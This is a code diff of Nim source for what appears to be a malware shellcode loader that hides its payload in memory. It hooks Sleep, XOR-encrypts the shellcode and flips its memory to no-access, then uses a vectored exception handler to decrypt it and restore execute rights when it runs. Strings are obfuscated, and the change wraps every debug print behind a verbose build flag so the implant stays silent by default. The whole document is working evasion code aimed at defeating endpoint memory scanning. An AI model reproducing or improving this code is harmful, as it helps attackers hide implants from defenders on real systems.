@@ -70,11 +70,13 @@ type
 # No Syscalls for the moment
 var ntdlldll = LoadLibraryA(obf("ntdll.dll"))
 if (ntdlldll == 0):
-    echo obf("[X] Failed to load ntdll.dll")
+    when defined(verbose):
+        echo obf("[X] Failed to load ntdll.dll")
 
 var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,obf("NtFlushInstructionCache"))
 if isNil(NtFlushInstructionCacheAddress):
-    echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
+    when defined(verbose):
+        echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
 
 var NtFlushInstructionCache*: MyNtFlushInstructionCache
 NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)
@@ -135,7 +137,8 @@ proc MySleep (dwMilliseconds: DWORD): void =
         # Restore original memory protection and revert to original shellcode.
         shellcodeEncryptDecrypt(caller);
     else:
-        echo obf("Waiting for VEH Exception")
+        when defined(verbose):
+            echo obf("Waiting for VEH Exception")
         #[
          If we fluctuate to PAGE_NOACCESS there is no need to decrypt and revert back memory protections just yet.
          We await for Access Violation exception to occur, catch it and from within the exception handler will adjust 
@@ -188,7 +191,8 @@ proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOI
     if (installHook):
         if (buffers != nil):
             if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
-                echo obf("Previous Bytes == 0")
+                when defined(verbose):
+                    echo obf("Previous Bytes == 0")
                 return false
             copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
 
@@ -203,7 +207,8 @@ proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOI
         #echo "Original Bytes Size: ", buffers.originalBytesSize
         if (buffers != nil):
             if ((buffers.originalBytes == 0) or buffers.originalBytesSize == 0):
-                echo obf("Original Bytes == 0")
+                when defined(verbose):
+                    echo obf("Original Bytes == 0")
                 return false
 
             dwSize = buffers.originalBytesSize
@@ -214,9 +219,11 @@ proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOI
     
     var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
     if (status == 0):
-        echo obf("NtFlushInstructionCache success")
+        when defined(verbose):
+            echo obf("NtFlushInstructionCache success")
     else:
-        echo obf("NtFlushInstructionCache failed: "), toHex(status)
+        when defined(verbose):
+            echo obf("NtFlushInstructionCache failed: "), toHex(status)
     VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
 
     return output
@@ -252,12 +259,15 @@ proc shellcodeEncryptDecrypt(callerAddress: LPVOID): void =
 
         if ((not g_fluctuationData.currentlyEncrypted) or ((g_fluctuationData.currentlyEncrypted) and (g_fluctuate == FluctuatetoNA))):
             VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &g_fluctuationData.protect)
-            echo obf("Flipped to RW")
+            when defined(verbose):
+                echo obf("Flipped to RW")
         
         if (g_fluctuationData.currentlyEncrypted):
-            echo obf("Decoding...")
+            when defined(verbose):
+                echo obf("Decoding...")
         else:
-            echo obf("Encoding")
+            when defined(verbose):
+                echo obf("Encoding")
         
         xorFunc(cast[ptr uint32](g_fluctuationData.shellcodeAddr), size_t(g_fluctuationData.shellcodeSize), uint32(g_fluctuationData.encodeKey))
         
@@ -272,16 +282,19 @@ proc shellcodeEncryptDecrypt(callerAddress: LPVOID): void =
               //      https://github.com/ORCA666/0x41/blob/main/0x41/HookingLoader.hpp#L285
               //
             ]#
-            echo obf("Flipping to NA")
+            when defined(verbose):
+                echo obf("Flipping to NA")
             var protectSuccess = VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &oldProtection)
-            echo protectSuccess
+            when defined(verbose):
+                echo protectSuccess
             #g_fluctuationData.currentlyEncrypted = true
             #echo "WhatTHe"
             #echo "Flipped to NA"
 
         elif(g_fluctuationData.currentlyEncrypted):
             VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &oldProtection)
-            echo obf("Flipped back to RX/RWX")
+            when defined(verbose):
+                echo obf("Flipped back to RX/RWX")
         
         g_fluctuationData.currentlyEncrypted = (not g_fluctuationData.currentlyEncrypted)
 
@@ -294,14 +307,17 @@ proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG =
         when defined(i386):
             caller = pExceptInfo.ContextRecord.Eip
     
-    echo obf("Access Violation at: "), toHex(caller)
+    when defined(verbose):
+        echo obf("Access Violation at: "), toHex(caller)
 
     # Check if the exception's instruction pointer (EIP/RIP) points back to our shellcode allocation.
     # If it does, it means our shellcode attempted to run but was unable to due to the PAGE_NOACCESS.
 
     if ((ULONG(caller) >= cast[ULONG](g_fluctuationData.shellcodeAddr)) and (ULONG(caller) <= cast[ULONG](g_fluctuationData.shellcodeAddr) + g_fluctuationData.shellcodeSize)):
-        echo obf("Shellcode attempted to run but was unable to due to the PAGE_NOACCESS.")
-        echo obf("Flipping back to RX/RWX...")
+        when defined(verbose):
+            echo obf("Shellcode attempted to run but was unable to due to the PAGE_NOACCESS.")
+        when defined(verbose):
+            echo obf("Flipping back to RX/RWX...")
         # We'll now decrypt (XOR32) shellcode's memory allocation and flip its memory pages back to RX.
         
         shellcodeEncryptDecrypt(cast[LPVOID](caller))
@@ -309,7 +325,8 @@ proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG =
         # Tell the system everything's OK and we can carry on.
         return EXCEPTION_CONTINUE_EXECUTION
 
-    echo obf("Unhandled exception occured. Not the one due to PAGE_NOACCESS")
+    when defined(verbose):
+        echo obf("Unhandled exception occured. Not the one due to PAGE_NOACCESS")
     # Oops, something else just happened and that wasn't due to our PAGE_NOACCESS trick.
     return EXCEPTION_CONTINUE_SEARCH
 
